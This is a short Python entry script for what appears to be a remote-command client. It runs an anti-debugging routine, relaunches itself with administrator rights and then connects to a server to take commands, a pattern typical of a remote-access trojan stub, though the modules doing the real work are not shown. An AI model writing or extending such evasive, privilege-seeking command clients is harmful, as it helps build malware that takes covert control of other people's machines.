from client.client import Client
from client.handlers import CommandHandler
from modules import antidb
from common import utils

def main():
    # Anti-debugging
    antidb.AntiDebug()

    # Ensure the script runs with elevated permissions
    if not utils.isUserAdmin():
        utils.runAsAdmin()

    # Start the client
    server_address = ('localhost', 8080)
    command_handler = CommandHandler()
    client = Client(server_address, command_handler)
    client.run()

if __name__ == "__main__":
    main()
